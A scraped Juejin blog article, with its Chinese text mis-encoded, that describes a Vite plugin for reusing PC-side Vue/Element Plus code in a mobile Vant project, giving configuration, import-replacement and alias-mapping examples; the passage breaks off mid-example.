content="https://juejin.cn/user/1019992474918343"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€ä¸ªViteæ’ä»¶å®ç°PCåˆ°ç§»åŠ¨ç«¯é¡¹ç›®çš„é«˜æ•ˆè¿ç§»æ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1019992474918343/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æµ®å¹»äº‘æœˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T09:24:34.000Z" title="Fri Jan 30 2026 09:24:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å½“PCç«¯é¡¹ç›®éœ€è¦è¿ç§»åˆ°ç§»åŠ¨ç«¯æ—¶ï¼Œä½ æ˜¯å¦è¿˜åœ¨æ‰‹åŠ¨å¤åˆ¶ç²˜è´´ä»£ç ï¼Ÿä»Šå¤©åˆ†äº«ä¸€ä¸ªæˆ‘ä»¬å›¢é˜Ÿè‡ªç ”çš„Viteæ’ä»¶ï¼Œå¸®ä½ å®ç°è·¨ä»“åº“ã€è·¨æŠ€æœ¯æ ˆçš„ä»£ç é«˜æ•ˆå¤ç”¨ï¼</p>
<h2 data-id="heading-0">èƒŒæ™¯ï¼šä»PCåˆ°ç§»åŠ¨ç«¯çš„è¿ç§»ä¹‹ç—›</h2>
<p>æœ€è¿‘æˆ‘ä»¬å›¢é˜Ÿé‡åˆ°äº†ä¸€ä¸ªå…¸å‹çš„ä¼ä¸šçº§éœ€æ±‚ï¼š<strong>å°†ä¸€ä¸ªæˆç†Ÿçš„PCç«¯åŒ»ç–—ç®¡ç†ç³»ç»Ÿï¼ˆMDMï¼‰è¿ç§»åˆ°ç§»åŠ¨ç«¯</strong>ã€‚å¬èµ·æ¥ç®€å•ï¼Œä½†å®é™…ä¸Šå´é¢ä¸´è¯¸å¤šæŒ‘æˆ˜ï¼š</p>
<h3 data-id="heading-1">é¢ä¸´çš„æŒ‘æˆ˜</h3>
<ol>
<li><strong>æŠ€æœ¯æ ˆå·®å¼‚</strong>ï¼šPCç«¯ä½¿ç”¨Element Plusï¼Œç§»åŠ¨ç«¯éœ€è¦Vant</li>
<li><strong>ä»“åº“éš”ç¦»</strong>ï¼šPCç«¯å’Œç§»åŠ¨ç«¯åœ¨ä¸åŒçš„Gitä»“åº“</li>
<li><strong>ä»£ç å¤ç”¨</strong>ï¼šå¸Œæœ›å¤ç”¨80%çš„ä¸šåŠ¡é€»è¾‘ï¼Œä½†UIç»„ä»¶å®Œå…¨ä¸åŒ</li>
<li><strong>ç»´æŠ¤åŒæ­¥</strong>ï¼šä¸šåŠ¡é€»è¾‘æ›´æ–°éœ€è¦åœ¨ä¸¤ç«¯åŒæ­¥</li>
</ol>
<p>ä¼ ç»Ÿçš„è§£å†³æ–¹æ¡ˆè¦ä¹ˆæ˜¯<strong>å®Œå…¨é‡å†™</strong>ï¼ˆæˆæœ¬é«˜ï¼‰ï¼Œè¦ä¹ˆæ˜¯<strong>å¤åˆ¶ç²˜è´´</strong>ï¼ˆç»´æŠ¤å™©æ¢¦ï¼‰,æˆ–è€…æ˜¯<strong>Monorepo</strong> (ä»£ç å’Œä¾èµ–æ”¾ä¸€èµ·)ã€‚æˆ‘ä»¬éœ€è¦çš„æ˜¯ä¸€ç§æ—¢èƒ½å¤ç”¨æ ¸å¿ƒé€»è¾‘ï¼Œä»£ç åœ¨ä¸åŒä»“åº“ç»´æŠ¤ï¼Œåˆèƒ½çµæ´»å®šåˆ¶UIçš„è§£å†³æ–¹æ¡ˆã€‚</p>
<h2 data-id="heading-2">è§£å†³æ–¹æ¡ˆï¼švite-plugin-code-reuse</h2>
<p>åŸºäºè¿™ä¸ªéœ€æ±‚ï¼Œæˆ‘ä»¬å¼€å‘äº† <code>vite-plugin-code-reuse</code> æ’ä»¶ï¼Œå®ƒçš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š<strong>å¤šä»“åº“ä»£ç å¤ç”¨ã€æ™ºèƒ½æ›¿æ¢ã€æ— ç¼é›†æˆ</strong>ã€‚</p>
<h3 data-id="heading-3">æ’ä»¶æ ¸å¿ƒèƒ½åŠ›</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ’ä»¶çš„æ ¸å¿ƒé…ç½®ç»“æ„</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">PluginConfig</span> {
  <span class="hljs-attr">repositories</span>: <span class="hljs-title class_">RepositoryConfig</span>[];     <span class="hljs-comment">// ä»£ç ä»“åº“é…ç½®</span>
  <span class="hljs-attr">repoImportMappings</span>: <span class="hljs-title class_">RepoImportMappings</span>[]; <span class="hljs-comment">// è·¯å¾„æ˜ å°„ï¼Œä¸»è¦æ˜¯è§„é¿ä¸åŒä»“åº“è·¯å¾„åˆ«åå†²çªé—®é¢˜</span>
  <span class="hljs-attr">importReplacements</span>: <span class="hljs-title class_">ImportReplacementConfig</span>[]; <span class="hljs-comment">// å¯¼å…¥æ›¿æ¢</span>
}
</code></pre>
<h2 data-id="heading-4">å®æˆ˜æ¡ˆä¾‹ï¼šåŒ»ç–—ç®¡ç†ç³»ç»Ÿè¿ç§»</h2>
<p>è®©æˆ‘é€šè¿‡å®é™…æ¡ˆä¾‹å±•ç¤ºè¿™ä¸ªæ’ä»¶çš„æ•ˆæœã€‚</p>
<h3 data-id="heading-5">é¡¹ç›®èƒŒæ™¯</h3>
<ul>
<li><strong>PCç«¯é¡¹ç›®</strong>ï¼š<code>xlian-web-mdm</code>ï¼ˆVue 3 + Element Plus + TypeScriptï¼‰</li>
<li><strong>ç§»åŠ¨ç«¯é¡¹ç›®</strong>ï¼šæ–°å»ºçš„H5é¡¹ç›®ï¼ˆVue 3 + Vant + TypeScriptï¼‰</li>
<li><strong>ç›®æ ‡</strong>ï¼šå¤ç”¨PCç«¯80%çš„ä¸šåŠ¡é€»è¾‘ï¼Œ100%æ›¿æ¢UIç»„ä»¶</li>
</ul>
<h3 data-id="heading-6">ç¬¬ä¸€æ­¥ï¼šå®‰è£…é…ç½®æ’ä»¶</h3>
<pre><code class="hljs language-bash" lang="bash">npm install vite-plugin-code-reuse --save-dev
</code></pre>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// vite.config.ts</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> vue <span class="hljs-keyword">from</span> <span class="hljs-string">'@vitejs/plugin-vue'</span>
<span class="hljs-keyword">import</span> codeReusePlugin <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-code-reuse'</span>
<span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">'path'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-title function_">vue</span>(),
    <span class="hljs-title function_">codeReusePlugin</span>({
      <span class="hljs-comment">// 1. å¼•å…¥PCç«¯ä»£ç ä»“åº“</span>
      <span class="hljs-attr">repositories</span>: [
        {
          <span class="hljs-attr">url</span>: <span class="hljs-string">'http://gitlab.xinglianhealth.com/web/mdm/xlian-web-mdm.git'</span>,
          <span class="hljs-attr">branch</span>: <span class="hljs-string">'master'</span>,
          <span class="hljs-attr">dir</span>: <span class="hljs-string">'mdm-pc'</span>  <span class="hljs-comment">// æœ¬åœ°å­˜æ”¾ç›®å½•</span>
        }
      ],
      
      <span class="hljs-comment">// 2. ä¿®æ­£è·¯å¾„åˆ«åæ˜ å°„,pcå’Œç§»åŠ¨éƒ½é…ç½®äº†â€œ@â€åˆ«åï¼Œéœ€è¦å„è‡ªå¼•ç”¨æ­£ç¡®çš„è·¯å¾„</span>
      <span class="hljs-attr">repoImportMappings</span>: [
        {
          <span class="hljs-attr">alias</span>: <span class="hljs-string">'@'</span>,
          <span class="hljs-attr">repoDir</span>: <span class="hljs-string">'mdm-pc'</span>,
          <span class="hljs-comment">// PCç«¯ä¸­çš„â€œ@â€åˆ«åè¿˜æ˜¯å¼•ç”¨pcç«¯ç›®å½•ä¸‹çš„ä»£ç ï¼Œä½†æ˜¯éœ€è¦æ’é™¤è·¯ç”±ã€çŠ¶æ€ç®¡ç†ç­‰è·¯å¾„ï¼Œå¼•ç”¨ç§»åŠ¨ç«¯çš„ï¼Œå› ä¸ºè·¯ç”±å’Œstoreä¸èƒ½å­˜åœ¨ä¸¤ä¸ª</span>
          <span class="hljs-attr">ignorePatterns</span>: [<span class="hljs-string">'src/router'</span>, <span class="hljs-string">'src/store'</span>, <span class="hljs-string">'src/axios'</span>]
        }
      ],
      
      <span class="hljs-comment">// 3. æ™ºèƒ½å¯¼å…¥æ›¿æ¢ï¼Œpcç«¯çš„éƒ¨åˆ†ç»„ä»¶æ— æ³•å¤ç”¨æ—¶ï¼Œå¯ä»¥åšæ›¿æ¢</span>
      <span class="hljs-attr">importReplacements</span>: [
        <span class="hljs-comment">// åœºæ™¯1ï¼šç»„ä»¶æ›¿æ¢ï¼ˆElement Plus â†’ Vantï¼‰</span>
        {
          <span class="hljs-attr">pattern</span>: <span class="hljs-regexp">/\/views\/MasterData\/components\/UploadFile\.vue$/</span>,
          <span class="hljs-attr">file</span>: <span class="hljs-string">'src/components/MbUpload.vue'</span> <span class="hljs-comment">// ç§»åŠ¨ç«¯ä¸“ç”¨ä¸Šä¼ ç»„ä»¶</span>
        },
        {
          <span class="hljs-attr">pattern</span>: <span class="hljs-regexp">/\/views\/MasterData\/components\/TextInput\.vue$/</span>,
          <span class="hljs-attr">file</span>: <span class="hljs-string">'src/components/MbTextInput.vue'</span> <span class="hljs-comment">// ç§»åŠ¨ç«¯è¾“å…¥æ¡†</span>
        },
        
        <span class="hljs-comment">// åœºæ™¯2ï¼šå¤æ‚è¡¨å•ç»„ä»¶æ›¿æ¢</span>
        {
          <span class="hljs-attr">pattern</span>: <span class="hljs-regexp">/\/views\/MasterData\/components\/MasterForm\.vue$/</span>,
          <span class="hljs-attr">file</span>: <span class="hljs-string">'src/components/MbForm.vue'</span> <span class="hljs-comment">// ç§»åŠ¨ç«¯è¡¨å•å°è£…</span>
        },
        
        <span class="hljs-comment">// åœºæ™¯3ï¼šPCç«¯ç‰¹æœ‰åŠŸèƒ½åœ¨ç§»åŠ¨ç«¯éšè—</span>
        {
          <span class="hljs-attr">pattern</span>: <span class="hljs-regexp">/\/views\/MasterData\/components\/HeaderFilter\/HeaderFilter\.vue$/</span>,
          <span class="hljs-attr">code</span>: <span class="hljs-string">'&lt;template&gt;&lt;/template&gt;'</span> <span class="hljs-comment">// ç§»åŠ¨ç«¯ä¸éœ€è¦å¤æ‚çš„è¡¨å¤´ç­›é€‰</span>
        },
        
        <span class="hljs-comment">// åœºæ™¯4ï¼šUIåº“æ›¿æ¢</span>
        {
          <span class="hljs-attr">pattern</span>: <span class="hljs-regexp">/^@?element-plus/</span>,
          <span class="hljs-attr">resolve</span>: path.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'src/components/ElementPlus.ts'</span>) <span class="hljs-comment">// é‡å®šå‘åˆ°å…¼å®¹å±‚</span>
        }
      ]
    })
  ]
})
</code></pre>
<h3 data-id="heading-7">ç¬¬äºŒæ­¥ï¼šUIç»„ä»¶æ›¿æ¢</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/components/ElementPlus.ts - UIåº“å…¼å®¹å±‚</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span>, <span class="hljs-title class_">Input</span>, <span class="hljs-title class_">Select</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./ui-adaptor'</span>

<span class="hljs-comment">// åˆ›å»ºElement Plusåˆ°Vantçš„æ˜ å°„</span>
<span class="hljs-keyword">export</span> {
  <span class="hljs-title class_">ElButton</span>: <span class="hljs-title class_">Button</span>,
  <span class="hljs-title class_">ElInput</span>: <span class="hljs-title class_">Input</span>,
  <span class="hljs-title class_">ElSelect</span>: <span class="hljs-title class_">Select</span>,
  <span class="hljs-comment">// ... æ›´å¤šæ˜ å°„</span>
}

<span class="hljs-comment">// src/components/ui-adaptor.ts - UIåº“é€‚é…å±‚,ä»¥Buttonç»„ä»¶ä¸ºä¾‹</span>

&lt;template&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">van-button</span> <span class="hljs-attr">v-bind</span>=<span class="hljs-string">"$attrs"</span> /&gt;</span></span>&lt;/template&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">const</span> props = <span class="hljs-title function_">defineProps</span>({
<span class="hljs-comment">// å¯¹element-plus Button Propsåšé€‚é…ï¼Œæ¯”å¦‚sizeä¸æ”¯æŒ"medium"ï¼Œå¯ä»¥å¤„ç†æˆå…¶ä»–çš„,ç›¸åŒçš„å±æ€§ä¸ç”¨å¤„ç†</span>
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<h3 data-id="heading-8">ç¬¬ä¸‰æ­¥ï¼šå¤ç”¨ä¸šåŠ¡é€»è¾‘ç»„ä»¶</h3>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- src/views/MasterData/PatientList.vue --&gt;
&lt;template&gt;
  &lt;!-- å¤ç”¨PCç«¯çš„æ¨¡æ¿ç»“æ„ï¼Œä½†ä½¿ç”¨ç§»åŠ¨ç«¯ç»„ä»¶ --&gt;
  &lt;div class="patient-list"&gt;
    &lt;!-- æœç´¢æ¡†ï¼ˆPCç«¯æ˜¯ElInputï¼Œè‡ªåŠ¨æ›¿æ¢ä¸ºVant Fieldï¼‰ --&gt;
    &lt;van-field 
      v-model="searchKey"
      placeholder="æœç´¢æ‚£è€…"
      @input="handleSearch"
    /&gt;
    
    &lt;!-- æ‚£è€…åˆ—è¡¨ --&gt;
    &lt;van-list 
      v-model:loading="loading"
      :finished="finished"
      @load="loadPatients"
    &gt;
      &lt;patient-item 
        v-for="patient in patients"
        :key="patient.id"
        :patient="patient"
        @click="handlePatientClick"
      /&gt;
    &lt;/van-list&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup lang="ts"&gt;
// è¿™é‡Œç›´æ¥å¤ç”¨PCç«¯çš„ä¸šåŠ¡é€»è¾‘ï¼
import { usePatientList } from '@/mdm-pc/src/views/MasterData/composables/usePatientList'

// å®Œå…¨å¤ç”¨PCç«¯çš„é€»è¾‘ï¼ŒåŒ…æ‹¬ï¼š
// 1. æ•°æ®è·å–é€»è¾‘
// 2. æœç´¢è¿‡æ»¤é€»è¾‘  
// 3. åˆ†é¡µé€»è¾‘
// 4. äº‹ä»¶å¤„ç†é€»è¾‘
const {
  patients,
  loading,
  finished,
  searchKey,
  loadPatients,
  handleSearch,
  handlePatientClick
} = usePatientList()
&lt;/script&gt;

&lt;style scoped&gt;
/* ç§»åŠ¨ç«¯ç‰¹æœ‰çš„æ ·å¼ */
.patient-list {
  padding: 12px;
}
&lt;/style&gt;
</code></pre>
<h2 data-id="heading-9">æ’ä»¶çš„æ ¸å¿ƒå®ç°åŸç†</h2>
<h3 data-id="heading-10">1. ä»£ç ä»“åº“ç®¡ç†</h3>
<p>vite build startå¼€å§‹æ—¶ï¼Œè‡ªåŠ¨æ‹‰å–PCç«¯ä»“åº“ä»£ç ï¼Œå¦‚æ— æ›´æ–°ä¸ä¼šé‡å¤æ‹‰å–ï¼Œé»˜è®¤åªæ‹‰å–ä¸€ä¸ªcommitï¼Œé€Ÿåº¦æå¿«ã€‚</p>
<pre><code class="hljs language-js" lang="js">{
  <span class="hljs-attr">url</span>: <span class="hljs-string">'http://gitlab.xinglianhealth.com/web/mdm/xlian-web-mdm.git'</span>, <span class="hljs-comment">//ä»“åº“åœ°å€</span>
  <span class="hljs-attr">branch</span>: <span class="hljs-string">'master'</span>, <span class="hljs-comment">// ä»“åº“åˆ†æ”¯</span>
  <span class="hljs-attr">dir</span>: <span class="hljs-string">'mdm-pc'</span>  <span class="hljs-comment">// æœ¬åœ°å­˜æ”¾ç›®å½•</span>
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b6ca51236224404b5ba283028673f6e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rWu5bm75LqR5pyI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770369874&amp;x-signature=clzoq9KrtH6yG2l7yvIQ0M0W9jw%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-csharp" lang="csharp">
<span class="hljs-meta">### 2. æ™ºèƒ½å¯¼å…¥æ›¿æ¢ï¼Œæ”¯æŒä¸‰ç§æ›¿æ¢æ–¹å¼ï¼Œä»»æ„é€‰æ‹©</span>

```typescript
<span class="hljs-keyword">interface</span> <span class="hljs-title">ImportReplacementConfig</span> {
    <span class="hljs-comment">/**
     * åŒ¹é…æ¨¡å¼ï¼ˆæ­£åˆ™è¡¨è¾¾å¼å­—ç¬¦ä¸²ï¼‰
     */</span>
    pattern: RegExp;
    <span class="hljs-comment">/**
     * æ›¿æ¢æ–¹å¼ï¼šä»£ç å­—ç¬¦ä¸²
     */</span>
    code?: <span class="hljs-built_in">string</span>;
    <span class="hljs-comment">/**
     * æ›¿æ¢æ–¹å¼ï¼šæ–‡ä»¶è·¯å¾„
     */</span>
    file?: <span class="hljs-built_in">string</span>;
    <span class="hljs-comment">/**
     * æ›¿æ¢æ–¹å¼ï¼šé‡å®šå‘è·¯å¾„
     */</span>
    resolve?: <span class="hljs-built_in">string</span>;
}
</code></pre>
<h3 data-id="heading-11">3. åˆ«åè·¯å¾„å†²çªæ˜ å°„ä¿®æ­£ï¼Œå°†è¢«å¼•ç”¨çš„ä»“åº“å†…éƒ¨åˆ«åæŒ‡å‘ä»“åº“å†…éƒ¨ï¼Œè§„é¿å’Œå¤–å±‚åˆ«åçš„å†²çª</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">RepoImportMappings</span> {
    <span class="hljs-comment">/**
     * è·¯å¾„åˆ«å
     */</span>
    <span class="hljs-attr">alias</span>: <span class="hljs-built_in">string</span>;
    <span class="hljs-comment">/**
     * å†²çªçš„ä»“åº“ç›®å½•
     */</span>
    <span class="hljs-attr">repoDir</span>: <span class="hljs-built_in">string</span>;
    <span class="hljs-comment">/**
     * å¿½ç•¥åˆ—è¡¨ï¼ˆè·¯å¾„åŒ¹é…æ—¶è·³è¿‡ï¼‰ï¼Œä½¿ç”¨å¤–å‡ºä»“åº“åˆ«åè§£æ
     */</span>
    ignorePatterns?: <span class="hljs-built_in">string</span>[];
}
</code></pre>
<h2 data-id="heading-12">å®é™…æ•ˆæœå¯¹æ¯”</h2>
<h3 data-id="heading-13">è¿ç§»å‰ï¼ˆä¼ ç»Ÿæ–¹å¼ï¼‰</h3>
<pre><code class="hljs language-scss" lang="scss">â”œâ”€â”€ ç§»åŠ¨ç«¯é¡¹ç›®
â”‚   â”œâ”€â”€ <span class="hljs-attribute">src</span>
â”‚   â”‚   â”œâ”€â”€ views
â”‚   â”‚   â”‚   â”œâ”€â”€ PatientList<span class="hljs-selector-class">.vue</span>    â† éœ€è¦é‡å†™
â”‚   â”‚   â”‚   â”œâ”€â”€ DoctorList<span class="hljs-selector-class">.vue</span>     â† éœ€è¦é‡å†™
â”‚   â”‚   â”‚   â””â”€â”€ ... (<span class="hljs-number">20</span>+ä¸ªé¡µé¢)
â”‚   â”‚   â””â”€â”€ components
â”‚   â”‚       â”œâ”€â”€ MbForm<span class="hljs-selector-class">.vue</span>         â† éœ€è¦é‡å†™
â”‚   â”‚       â””â”€â”€ ... (<span class="hljs-number">50</span>+ä¸ªç»„ä»¶)
â””â”€â”€ å·¥æ—¶ï¼š<span class="hljs-number">3</span>-<span class="hljs-number">4</span>äººæœˆ
</code></pre>
<h3 data-id="heading-14">è¿ç§»åï¼ˆä½¿ç”¨æ’ä»¶ï¼‰</h3>
<pre><code class="hljs language-scss" lang="scss">â”œâ”€â”€ ç§»åŠ¨ç«¯é¡¹ç›®
â”‚   â”œâ”€â”€ mdm-pc/                    â† è‡ªåŠ¨å¼•å…¥çš„PCç«¯ä»£ç 
â”‚   â”œâ”€â”€ <span class="hljs-attribute">src</span>
â”‚   â”‚   â”œâ”€â”€ views
â”‚   â”‚   â”‚   â”œâ”€â”€ PatientList<span class="hljs-selector-class">.vue</span>    â† ç›´æ¥å¼•ç”¨PCç«¯PatientListç»„ä»¶ï¼Œåªå¯¹æ ·å¼åšé€‚é…è¦†ç›–
â”‚   â”‚   â”‚   â”œâ”€â”€ DoctorList<span class="hljs-selector-class">.vue</span>     â† ç›´æ¥å¼•ç”¨PCç«¯DoctorListç»„ä»¶ï¼Œåªå¯¹æ ·å¼åšé€‚é…è¦†
â”‚   â”‚   â”‚   â””â”€â”€ ... (å¤ç”¨<span class="hljs-number">80%</span>)
â”‚   â”‚   â””â”€â”€ components
â”‚   â”‚       â”œâ”€â”€ MbUploader<span class="hljs-selector-class">.vue</span>     â† æ— æ³•å¤ç”¨çš„ç»„ä»¶ï¼Œç”¨ç§»åŠ¨ç«¯ä¸“ç”¨æ–‡ä»¶ç»„ä»¶åšæ›¿æ¢
â”‚   â”‚       â””â”€â”€ ... (åªéœ€å†™<span class="hljs-number">30%</span>çš„ç»„ä»¶)
â””â”€â”€ å·¥æ—¶ï¼š<span class="hljs-number">1</span>-<span class="hljs-number">1.5</span>äººæœˆï¼ˆèŠ‚çœ<span class="hljs-number">60%</span>+ï¼‰
</code></pre>
<h2 data-id="heading-15">é«˜çº§åº”ç”¨åœºæ™¯</h2>
<h3 data-id="heading-16">åœºæ™¯1ï¼šå¤šé¡¹ç›®å…±äº«å·¥å…·åº“</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å¤šä¸ªé¡¹ç›®å…±äº«å·¥å…·å‡½æ•°</span>
<span class="hljs-title function_">codeReusePlugin</span>({
  <span class="hljs-attr">repositories</span>: [
    {
      <span class="hljs-attr">url</span>: <span class="hljs-string">'git@github.com:company/shared-utils.git'</span>,
      <span class="hljs-attr">branch</span>: <span class="hljs-string">'main'</span>,
      <span class="hljs-attr">dir</span>: <span class="hljs-string">'shared-utils'</span>
    },
    ...
  ],
  <span class="hljs-attr">importReplacements</span>: [
    {
      <span class="hljs-attr">pattern</span>: <span class="hljs-regexp">/^@shared\/utils/</span>,
      <span class="hljs-attr">resolve</span>: path.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'shared-utils/src'</span>)
    },
    ...
  ]
})
</code></pre>
<h3 data-id="heading-17">åœºæ™¯2ï¼šä¸»é¢˜ç³»ç»Ÿåˆ‡æ¢</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ ¹æ®ç¯å¢ƒåˆ‡æ¢ä¸»é¢˜</span>
<span class="hljs-title function_">codeReusePlugin</span>({
  <span class="hljs-attr">importReplacements</span>: [
    {
      <span class="hljs-attr">pattern</span>: <span class="hljs-regexp">/\/themes\/default/</span>,
      <span class="hljs-attr">file</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">'mobile'</span> 
        ? <span class="hljs-string">'src/themes/mobile.vue'</span>
        : <span class="hljs-string">'src/themes/pc.vue'</span>
    }
  ]
})
</code></pre>
<h3 data-id="heading-18">åœºæ™¯3ï¼šA/Bæµ‹è¯•ç‰ˆæœ¬</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// A/Bæµ‹è¯•ä¸åŒç‰ˆæœ¬çš„ç»„ä»¶</span>
<span class="hljs-title function_">codeReusePlugin</span>({
  <span class="hljs-attr">importReplacements</span>: [
    {
      <span class="hljs-attr">pattern</span>: <span class="hljs-regexp">/\/components\/CheckoutButton\.vue$/</span>,
